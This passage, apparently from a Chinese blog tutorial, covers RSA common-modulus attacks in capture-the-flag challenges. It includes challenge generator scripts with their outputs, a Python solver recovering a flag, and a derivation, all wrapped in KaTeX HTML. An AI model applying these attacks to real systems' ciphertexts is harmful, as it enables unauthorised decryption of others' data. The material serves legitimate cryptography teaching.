mtight">s</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-1.209999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:-0.009999999999998621em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:1.1900000000000006em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:2.39em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:3.5899999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">肯</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">比</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">简</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">低</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">行</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.949999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></details><h3 id="共模攻击3"><a class="markdownIt-Anchor" href="#共模攻击3"></a> 共模攻击3</h3><ul><li>对于共模攻击第二种情况，是一种特殊情况，常常<code>gcd(e1,e2)≠1</code>且<code>gcd(e1,e2)=x</code>，其中<code>x</code>的值非常大。这时第二种特殊情况的解密方式就失效了，这样就需要其他方法进行解密。</li><li>当时作为题目，如果向前两题那样给<code>e1、e2、n1、c1、c2</code>意义不大，这就给出一个例题来解释一下为什么意义不大。</li><li>例题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e1 = getPrime(<span class="number">128</span>)</span><br><span class="line">e2 = getPrime(<span class="number">128</span>)*e1</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gcd(e1,e2) =&quot;</span>,gmpy2.gcd(e1,e2))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = 12354667105956633645505885082487144682190452234798696744645997387099207576568782658631934442079562902043942456124262934833548127310904873471712197692223151</span></span><br><span class="line"><span class="string">e1 = 270516821232137091700320423668458210961</span></span><br><span class="line"><span class="string">e2 = 74165178148542517862331801316190749703819740833698961718616221944701759350097</span></span><br><span class="line"><span class="string">n = 124362644099775589902895946839476348022174413338453678145721401915709742155330759419413072770801553367457435578733663875712725966971469138012348937210118369098587641022291949571805775053379343137964405130964761576037870442836679696951637890160763897515307124266679985615100850012111585355232442117821511116901</span></span><br><span class="line"><span class="string">c1 = 5323866568296193592597888660757755576275196057389707734801436861257713948360702550013617233647471845666237618134195707677924589283657252990214667642119909872937843516583639340445395869497166850947229435636274414115414211682655409715959874952450741948274955268734077411469869317050217707925192320235463094105</span></span><br><span class="line"><span class="string">c2 = 104238473081393587128152794405440554852627276869818642357715651393772747872001157068855372215013597488429196715877035300272216480821841080478521897746953706089933552869973864682399422752122505619328890632827768730523178351333183920997307503412724769094244190744010864067403009477588562252732503656561124542489</span></span><br><span class="line"><span class="string">gcd(e1,e2) = 270516821232137091700320423668458210961</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题使用<code>m = (pow(c1,s1,n)*pow(c2,s2,n))%n</code>求得后就会出现新的<code>e</code>，这样就相当于另一个<code>RSA</code>加密。如果已知p的话，就可以直接解密了，但是我们已知p还用共模攻击干嘛。所以这题意义不大。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">12354667105956633645505885082487144682190452234798696744645997387099207576568782658631934442079562902043942456124262934833548127310904873471712197692223151</span></span><br><span class="line">e1 = <span class="number">270516821232137091700320423668458210961</span></span><br><span class="line">e2 = <span class="number">74165178148542517862331801316190749703819740833698961718616221944701759350097</span></span><br><span class="line">n = <span class="number">124362644099775589902895946839476348022174413338453678145721401915709742155330759419413072770801553367457435578733663875712725966971469138012348937210118369098587641022291949571805775053379343137964405130964761576037870442836679696951637890160763897515307124266679985615100850012111585355232442117821511116901</span></span><br><span class="line">c1 = <span class="number">5323866568296193592597888660757755576275196057389707734801436861257713948360702550013617233647471845666237618134195707677924589283657252990214667642119909872937843516583639340445395869497166850947229435636274414115414211682655409715959874952450741948274955268734077411469869317050217707925192320235463094105</span></span><br><span class="line">c2 = <span class="number">104238473081393587128152794405440554852627276869818642357715651393772747872001157068855372215013597488429196715877035300272216480821841080478521897746953706089933552869973864682399422752122505619328890632827768730523178351333183920997307503412724769094244190744010864067403009477588562252732503656561124542489</span></span><br><span class="line"><span class="comment">#gcd(e1,e2) = 270516821232137091700320423668458210961</span></span><br><span class="line">e, s1, s2 = gmpy2.gcdext(e1,e2)</span><br><span class="line">q = n//p</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(m,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;4053c1a4-c301-4e23-b920-28b017ba38df&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>接下来介绍另一题，另一题才是共模攻击3的题型。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">k1 = random.randint(<span class="number">2</span>**<span class="number">128</span>,<span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">k2 = random.randint(<span class="number">2</span>**<span class="number">128</span>,<span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">e1 = getPrime(<span class="number">128</span>)*k1</span><br><span class="line">e2 = getPrime(<span class="number">128</span>)*k1*k2</span><br><span class="line">e3 = getPrime(<span class="number">128</span>)*k2</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line">c3 = <span class="built_in">pow</span>(m,e3,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e3 =&quot;</span>,e3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c3 =&quot;</span>,c3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gcd(e1,e2) =&quot;</span>,gmpy2.gcd(e1,e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gcd(e2,e3) = &quot;</span>,gmpy2.gcd(e2,e3))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = 6839979093843017245130935971073531650625865408597324093158075653007572029459535748591107780971041110617821327885728</span></span><br><span class="line"><span class="string">e2 = 527282383778630558435877705949699484729936503257091129495571879289998217841325217564810314237039659729265596452756258253436101100968118657130954223308875205257774585781949600635959096231751360</span></span><br><span class="line"><span class="string">e3 = 20987998930730242130690830835028138615595244455228017878066112490327400892650229366898248406466316235857196958485710</span></span><br><span class="line"><span class="string">n = 22175144708990630853036480868376123403731448276285717131186187150462023495494103565746117568235683365313517827941106620902013918484064641114476913481110938950785308733160550905735102713320438455824065792338146147847335388226116646541800245464845211085540907602598972170387771602880693683773805550988596358558621125283407314509610950378661338714027095643635739361829648482049383174885258194773716516785232715071895492339469667922183918303613284066664177945669438336799055529602328784963091965710713100236033780379337460945498971432359098326842627948461349746702776166953869600658895170340420434234372122272110975044659</span></span><br><span class="line"><span class="string">c1 = 11426478179683336827224880779953157546776076551240828268809350458296893628522712784864907995111968644902442693072364448063747658422225255036189101385357784689296259496649527761401899948136054211133883265341970543967599869525260654979500412480663418057379308458996911392485335767582507518973447401423943878293895212638047157663802239344638641314156758830964491691323026524366328874683360987516802872498983112781643154651435374108641997212467699796213730738052002284134749351805453079045833498972827333585113428885026516509660161906337450878179654072288419436265826131479983858828205102056301019221745568319757344882310</span></span><br><span class="line"><span class="string">c2 = 924553363795544361249557963373014280364009962681904215742379062140845462422058966956557303658832168491456051793505960008265313560082631349096509445336008684455437098964906094258030833746463869703797105150834953261601859026067804458980569864595116130499800793859913206222086000196754618550748639846744131641000960761007475985837366717289369284418559314663298108941564271462247365885229310605727917343982395106384199224643917254074484080305027204503813125672333323007771938062630610901748714884555438154614828690121207720526744717299121320271203097954739219600201683737833195114592138439396587112769674492174781048345</span></span><br><span class="line"><span class="string">c3 = 14746267922953594508934987983405936746727004380259552828471117039223733948341026916910718225093159503573963075699179842175533457878937869802023486477372942785557938018982551170721496415115172951210353253311347031831419025904122683204153082041761968643487702640595950727384113933573702782931552657234931764298271273287655619903274377134978785223623709621560907111004144880046847332195005770181319177034333945769165118402546185793312611428185399654124299299022380187589974664553807713456469247091344949181479956722950070165387894955829314074403945814066771174510119236751891447097319232129235383321537697205679053840336</span></span><br><span class="line"><span class="string">gcd(e1,e2) = 29540346448235016595457107953809410509141879299370840061983373145010008818272</span></span><br><span class="line"><span class="string">gcd(e2,e3) =  68493250011952459219512675036017846580344175598507893778164361048080116129970</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>接下来对该题型进行推导，其实就是使用两次共模攻击。</li></ul><details>    <summary>推导过程</summary><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由于</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由于</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由裴蜀定理得存在</mtext><mi>s</mi><mn>11</mn><mo separator="true">,</mo><mi>s</mi><mn>12</mn><mo>∈</mo><mi>Z</mi><mtext>有</mtext><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mn>11</mn><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>s</mi><mn>12</mn><mo>=</mo><mi>x</mi><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由裴蜀定理得存在</mtext><mi>s</mi><mn>21</mn><mo separator="true">,</mo><mi>s</mi><mn>22</mn><mo>∈</mo><mi>Z</mi><mtext>有</mtext><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mn>21</mn><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>s</mi><mn>22</mn><mo>=</mo><mi>x</mi><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以对</mtext><msub><mi>c</mi><mn>1</mn></msub><mtext>、</mtext><msub><mi>c</mi><mn>2</mn></msub><mtext>进行共模攻击、对</mtext><msub><mi>c</mi><mn>2</mn></msub><mtext>、</mtext><msub><mi>c</mi><mn>3</mn></msub><mtext>进行共模攻击</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>会得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>x</mi><mn>1</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>x</mi><mn>2</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>同时有</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这时我们再对</mtext><msub><mi>m</mi><mn>1</mn></msub><mtext>、</mtext><msub><mi>m</mi><mn>2</mn></msub><mtext>进行共模攻击即可得到</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mo>=</mo><msup><mi>m</mi><mi>x</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这时</mtext><msup><mi>m</mi><mi>x</mi></msup><mtext>比较小</mtext><mo separator="true">,</mo><mtext>这样就可以直接开方了</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}由于gcd(e_1,e_2)=x1\\由于gcd(e_2,e_3)=x2\\由裴蜀定理得存在s11,s12∈Z有e_1s11+e_2s12=x1\\由裴蜀定理得存在s21,s22∈Z有e_1s21+e_2s22=x2\\所以对c_1、c_2进行共模攻击、对c_2、c_3进行共模攻击\\会得到\\m_1 = m^{x_1}~~mod(n)\\m_2 = m^{x_2}~~mod(n)\\同时有gcd(x_1,x_2)=x\\这时我们再对m_1、m_2进行共模攻击即可得到\\m = m^x ~~mod(n)\\这时m^x比较小,这样就可以直接开方了\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:14.399999999999999em;vertical-align:-6.949999999999999em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.449999999999998em;"><span style="top:-9.609999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span></span></span><span style="top:-8.409999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mord">2</span></span></span><span style="top:-7.209999999999998em;"><span class="pstrut" style="height:3em;"></span><span 